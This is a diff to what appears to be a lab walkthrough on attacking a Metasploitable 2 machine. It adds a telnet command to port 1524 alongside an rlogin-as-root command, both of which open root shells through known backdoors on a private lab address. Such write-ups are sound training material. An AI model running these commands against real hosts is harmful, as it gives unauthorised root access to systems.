@@ -25,9 +25,9 @@ This is a PHP exploit. You won't get root with this.
 
 I don't think they'll patch this one very quick.
 
-## rlogin backdoor
+## rlogin/telnet backdoor
 
-This one is pretty simple. There's a backdoor in [rlogin](http://www.kalitutorials.net/2014/05/metasploitable-2-vulnerability.html)
+This one is pretty simple. There's a backdoor in [rlogin and telnet](http://www.kalitutorials.net/2014/05/metasploitable-2-vulnerability.html)
 
 ```
 sudo apt update; sudo apt install rsh-client
@@ -36,5 +36,10 @@ rlogin -l root 10.0.0.188
 
 ![Image of rlogin](images/rlogin.png)
 
+`telnet 10.0.0.188 1524`
+
+![Image of telnet](images/telnet.png)
+
 Hurry quick on this one.
+
 
